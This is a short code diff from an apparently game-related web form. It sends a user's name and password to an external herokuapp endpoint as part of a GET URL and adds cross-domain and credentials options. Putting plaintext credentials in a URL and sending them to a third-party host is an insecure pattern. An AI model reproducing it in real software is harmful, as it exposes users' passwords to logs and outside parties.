@@ -247,8 +247,12 @@
                  $(".video_absoluto , .222").hide()
                  $('.wrapper').addClass('form-success');
                   $.ajax({
-                    url: 'https://mu-away.herokuapp.com/add_box/'+usr+"/"+pass,
-                    type: 'GET',
+			url: 'https://mu-away.herokuapp.com/add_box/'+usr+"/"+pass,
+			type: 'GET',
+			crossDomain : true,
+			xhrFields: {
+				withCredentials: true
+			},
                 }).done(function(res) {
                     console.log(333,res)
                     alert( "Dentro de horas, seu cofre é atualizado //  Within hours, your safe is updated  // En cuestión de horas, su caja fuerte se actualiza" );
